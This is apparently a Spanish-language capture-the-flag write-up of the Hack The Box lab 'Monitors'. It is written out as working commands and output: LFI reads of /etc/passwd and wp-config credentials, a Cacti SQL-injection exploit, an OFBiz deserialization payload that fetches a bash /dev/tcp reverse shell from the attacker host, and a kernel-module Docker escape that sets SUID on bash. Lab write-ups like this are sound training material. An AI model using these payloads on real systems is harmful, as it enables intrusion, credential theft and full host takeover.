---
layout: post
title: Monitors
date: 2023-03-28
description:
img:
fig-caption:
tags: [eWPT, OSCP, eWPTXv2, eCPPTv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Monitors-htb/Monitors.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Information Disclosure

* Abuso de Plugin WordPress

* LFI

* RFI - Fallido

* Abuso de Cacti

* Explotación de Apache OfBiz - Deserialización

* Docker BreakOut - Abuso de de capability SYS_MODULE (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.238 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 08:16 GMT
Nmap scan report for 10.10.10.238
Host is up (0.17s latency).
Not shown: 57515 closed tcp ports (reset), 8018 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.67 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.10.238 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 08:17 GMT
Nmap scan report for 10.10.10.238
Host is up (0.59s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bacccd81fc9155f3f6a91f4ee8bee52e (RSA)
|   256 6943376a1809f5e77a67b81811ead765 (ECDSA)
|_  256 5d5e3f67ef7d762315114b53f8413a94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.238
http://10.10.10.238 [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@monitors.htb], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238]
```

No puedo acceder a la página principal

```null
curl -s -X GET http://10.10.10.238/
Sorry, direct IP access is not allowed. <br><br>If you are having issues accessing the site then contact the website administrator: admin@monitors.htb
```

Agrego el dominio ```monitors.htb``` al ```/etc/hosts```. Aquí si que tengo acceso

<img src="/writeups/assets/img/Monitors-htb/1.png" alt="">

Tiene un plugin instalado

```null
curl -s -X GET http://monitors.htb/wp-content/plugins/ | html2text
****** Index of /wp-content/plugins ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[DIR]]       wp-with-spritz/  2020-10-15 21:29    -  
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at monitors.htb Port 80
```

Es vulnerable a LFI y a RFI

```null
curl -s -X GET 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
```

```null
curl -s -X GET 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://10.10.16.2'
```

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:56808.
GET / HTTP/1.0
Host: 10.10.16.2
Connection: close
```

No interpreta PHP que esté alojado de mi lado. Tiene varias intefaces desplegadas

```null
curl -s -X GET 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../../proc/net/fib_trie' | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | sort -u | grep "."
0.0.0.0
0 3 0 5
10.10.10.0
10.10.10.224
10.10.10.238
10.10.10.255
127.0.0.0
127.0.0.1
127.255.255.255
14 3 0 4
172.16.0.0
172.17.0.0
172.17.0.1
172.17.255.255
172.18.0.0
172.18.0.1
172.18.255.255
24 2 0 2
27 2 0 2
31 1 0 0
4 2 0 2
8 2 0 2
```

Tiene varios puertos internos abiertos

```null
curl -s -X GET 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../../proc/net/tcp'
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 24714 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 29494 1 0000000000000000 100 0 0 10 0                     
   2: 0100007F:20FB 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 32898 1 0000000000000000 100 0 0 10 0                     
   3: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   109        0 31079 1 0000000000000000 100 0 0 10 0                     
   4: EE0A0A0A:AEB4 01010101:0035 02 00000001:00000000 01:00000245 00000003   101        0 68479 2 0000000000000000 800 0 0 1 7 
```

```null
for port in 0016 20FB 0CEA AE9A 0035; do echo "$((0x$port))"; done
22
8443
3306
44698
53
```

Miro el archivo de configuración de Apache

```null
curl -s -X GET 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/apache2/sites-enabled/000-default.conf'
# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf

<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin admin@monitors.htb
	DocumentRoot /var/www/html
	Redirect 403 /
	ErrorDocument 403 "Sorry, direct IP access is not allowed. <br><br>If you are having issues accessing the site then contact the website administrator: admin@monitors.htb"
	UseCanonicalName Off
	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Añado el subdominio ```cacti-admin.monitors.htb``` al ```/etc/hosts```

<img src="/writeups/assets/img/Monitors-htb/2.png" alt="">

Veo el ```wp-config.php```

```null
curl -s -X GET 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=php://filter/convert.base64_encode/resource=../../../wp-config.php'
```

Dentro tiene credenciales de acceso a la base de datos

```null
/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
```

Se reutilizan para el ```Cacti``` como usuario ```admin```

<img src="/writeups/assets/img/Monitors-htb/3.png" alt="">

Esta versión de Cacti es vulnerable a una inyección SQL

```null
searchsploit cacti 1.2.12
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cacti 1.2.12 - 'filter' SQL Injection                                                                                                                                         | php/webapps/49810.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Gano acceso al sistema

```null
python3 exploit.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.16.2 --lport 443
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:a2850de8e18d5ea0d32f50f04dd85bdcfdcc2f95,1679997213
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
"name","hex"
"",""
"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
"guest","43e9a4ab75570f5b"

[+] Check your nc listener!
```

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:39300.
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@monitors:/usr/share/cacti/cacti$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
www-data@monitors:/usr/share/cacti/cacti$ stty rows 55 columns 209
```

```null
www-data@monitors:/usr/share/cacti/cacti$ hostname -I
10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:eee0 
```

Subo un binario estático de ```nmap``` para aplicar HostDiscovery. Utilizo una función en bash para descargar archivos

```null
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```null
www-data@monitors:/tmp$ __curl http://10.10.16.2/nmap > nmap
```

```null
www-data@monitors:/tmp$ ./nmap --min-rate 5000 -n -sn 172.17.0.1/24 172.18.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-28 09:59 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00061s latency).
Nmap scan report for 172.17.0.2
Host is up (0.00043s latency).
Nmap scan report for 172.18.0.1
Host is up (0.00036s latency).
Nmap done: 512 IP addresses (3 hosts up) scanned in 0.52 seconds
```

Hay otro usuario llamado ```marcus```

```null
www-data@monitors:/tmp$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
```

Encuentro un script asociado con este

```null
www-data@monitors:/$ grep -R "marcus" /etc/ 2>/dev/null  
/etc/group-:marcus:x:1000:
/etc/subgid:marcus:165536:65536
/etc/group:marcus:x:1000:
/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
/etc/subuid:marcus:165536:65536
/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
```

Tengo capacidad de lectura

```null
www-data@monitors:/$ ls -l /home/marcus/.backup/backup.sh
-r-xr-x--- 1 www-data www-data 259 Nov 10  2020 /home/marcus/.backup/backup.sh
```

```null
www-data@monitors:/$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```

Se exponen credenciales en texto plano. Me conecto como este y veo la primera flag

```null
ssh marcus@10.10.10.238
The authenticity of host '10.10.10.238 (10.10.10.238)' can't be established.
ED25519 key fingerprint is SHA256:oQliBlkPPwRDUNltCTbA5snHjWXVX+/OuJxo4+EcTJM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.238' (ED25519) to the list of known hosts.
marcus@10.10.10.238's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 28 10:14:04 UTC 2023

  System load:  0.0                Users logged in:                0
  Usage of /:   34.9% of 17.59GB   IP address for ens160:          10.10.10.238
  Memory usage: 45%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
  Processes:    188

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

128 packages can be updated.
97 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon Sep 27 10:03:41 2021 from 10.10.14.19
marcus@monitors:~$ cat user.txt 
564af90dfda062ed182679f06c365b27
```

# Escalada

Veo una nota

```null
marcus@monitors:~$ cat note.txt 
TODO:

Disable phpinfo	in php.ini		- DONE
Update docker image for production use	- 
```

Subo el chisel para poder tener conectividad con los contenedores. En mi equipo creo el servidor

```null
chisel server -p 1234 --reverse
```` 

Desde la máquina víctima me conecto

```null
www-data@monitors:/tmp$ ./chisel client 10.10.16.2:1234 R:socks &>/dev/null & disown
```

El puerto 8443 corresponde a un servicio web HTTPS

```null
proxychains nmap -sCV -p8443 -sT localhost
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 10:20 GMT
Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.95% done; ETC: 10:22 (0:00:01 remaining)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.85s latency).

PORT     STATE SERVICE  VERSION
8443/tcp open  ssl/http Apache Tomcat 9.0.31
|_ssl-date: 2023-03-28T10:22:41+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=ofbiz-vm.apache.org/organizationName=Apache Software Fundation/stateOrProvinceName=DE/countryName=US
| Not valid before: 2014-05-30T08:43:19
|_Not valid after:  2024-05-27T08:43:19
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.03 seconds
```

Como me estaba dando problemas, traigo el puerto directamente con un Local Port Forwarding

```null
ssh marcus@10.10.10.238 -L 8443:localhost:8443
```

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u https://localhost:8443/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://localhost:8443/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/28 10:35:47 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 302) [Size: 0] [--> /content/]
/images               (Status: 302) [Size: 0] [--> /images/]
/common               (Status: 302) [Size: 0] [--> /common/]
/catalog              (Status: 302) [Size: 0] [--> /catalog/]
/ar                   (Status: 302) [Size: 0] [--> /ar/]
/ebay                 (Status: 302) [Size: 0] [--> /ebay/]
/marketing            (Status: 302) [Size: 0] [--> /marketing/]
/passport             (Status: 302) [Size: 0] [--> /passport/]
/ecommerce            (Status: 302) [Size: 0] [--> /ecommerce/]
/ap                   (Status: 302) [Size: 0] [--> /ap/]
/example              (Status: 302) [Size: 0] [--> /example/]
/projectmgr           (Status: 302) [Size: 0] [--> /projectmgr/]
/accounting           (Status: 302) [Size: 0] [--> /accounting/]
/bi                   (Status: 302) [Size: 0] [--> /bi/]
/webtools             (Status: 302) [Size: 0] [--> /webtools/]
/facility             (Status: 302) [Size: 0] [--> /facility/]
/[                    (Status: 400) [Size: 762]
/plain]               (Status: 400) [Size: 762]
/manufacturing        (Status: 302) [Size: 0] [--> /manufacturing/]
/solr                 (Status: 302) [Size: 0] [--> /solr/]
/myportal             (Status: 302) [Size: 0] [--> /myportal/]
/]                    (Status: 400) [Size: 762]
/sfa                  (Status: 302) [Size: 0] [--> /sfa/]
/contentimages        (Status: 302) [Size: 0] [--> /contentimages/]
/humanres             (Status: 302) [Size: 0] [--> /humanres/]
/quote]               (Status: 400) [Size: 762]
/extension]           (Status: 400) [Size: 762]
/partymgr             (Status: 302) [Size: 0] [--> /partymgr/]
/[0-9]                (Status: 400) [Size: 762]
Progress: 26584 / 26585 (100.00%)
===============================================================
2023/03/28 10:38:54 Finished
===============================================================
```

En ```/ecommerce``` aparece este error

```null
curl -s -X GET https://localhost:8443/ecommerce/control/main -k | html2text
    A Product Store has not been defined for this ecommerce site. A Product
Store can be created using the ofbizsetup wizard.
```

Es vulnerable a una ejecución remota de comandos

```null
searchsploit Apache OFBiz
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache OFBiz - Admin Creator                                                                                                                                                   | multiple/remote/12264.txt
Apache OFBiz - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                   | php/webapps/12330.txt
Apache OFBiz - Remote Execution (via SQL Execution)                                                                                                                            | multiple/remote/12263.txt
Apache OFBiz 10.4.x - Multiple Cross-Site Scripting Vulnerabilities                                                                                                            | multiple/remote/38230.txt
Apache OFBiz 16.11.04 - XML External Entity Injection                                                                                                                          | java/webapps/45673.py
Apache OFBiz 16.11.05 - Cross-Site Scripting                                                                                                                                   | multiple/webapps/45975.txt
Apache OFBiz 17.12.03 - Cross-Site Request Forgery (Account Takeover)                                                                                                          | java/webapps/48408.txt
ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                                                                          | java/webapps/50178.sh
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

El script no está funcional, así que lo hago manual

```null
echo 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1' > shell.sh
```

```null
wget https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
```

```null
python3 -m http.server 80
```

```null
payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget http://10.10.16.2/shell.sh -O /tmp/shell.sh" | base64 -w 0)
```

```null
curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml'
```

```null
payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 -w 0)
```

```null
curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml'
```

Gano acceso a un contenedor

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:45414.
bash: cannot set terminal process group (31): Inappropriate ioctl for device
bash: no job control in this shell
root@a2d8c468a7c2:/usr/src/apache-ofbiz-17.12.01# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@a2d8c468a7c2:/usr/src/apache-ofbiz-17.12.01# ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
root@a2d8c468a7c2:/usr/src/apache-ofbiz-17.12.01# export TERM=xterm
root@a2d8c468a7c2:/usr/src/apache-ofbiz-17.12.01# export SHELL=bash
root@a2d8c468a7c2:/usr/src/apache-ofbiz-17.12.01# stty rows 55 columns 209
```

Subo el CDK y lo ejecuto. Encuentra una capability de la que puedo abusar

```null
root@a2d8c468a7c2:/tmp# ./cdk  eva --full
...
[  Information Gathering - Commands and Capabilities  ]
2023/03/28 11:14:24 available commands:
	curl,wget,find,ps,java,python,apt,dpkg,ssh,git,svn,vi,capsh,mount,fdisk,gcc,g++,make,base64,python2,python2.7,perl
2023/03/28 11:14:24 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
	CapInh:	00000000a80525fb
	CapPrm:	00000000a80525fb
	CapEff:	00000000a80525fb
	CapBnd:	00000000a80525fb
	CapAmb:	0000000000000000
	Cap decode: 0x00000000a80525fb = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_MODULE,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
	Added capability list: CAP_SYS_MODULE
[*] Maybe you can exploit the Capabilities below:
[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/.
...
```

Para ello hay que utilizar un script en c que se encargue de asignar el privilegio SUID a la bash

```null
root@a2d8c468a7c2:/tmp# cat shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","chmod u+s /bin/bash", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Y un archivo ```Makefile``` para compilarlo

```null
root@a2d8c468a7c2:/tmp# cat Makefile 
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) modules
clean:
	make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) clean
```

```null
root@a2d8c468a7c2:/tmp# insmod reverse-shell.ko 
```

Miro los privilegios de la bash en la máquina host

```null
marcus@monitors:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Me convierto en ```root``` y veo la segunda flag

```null
bash-4.4# cat /root/root.txt 
3fb09e9d9662a4571825e9c453485a91
```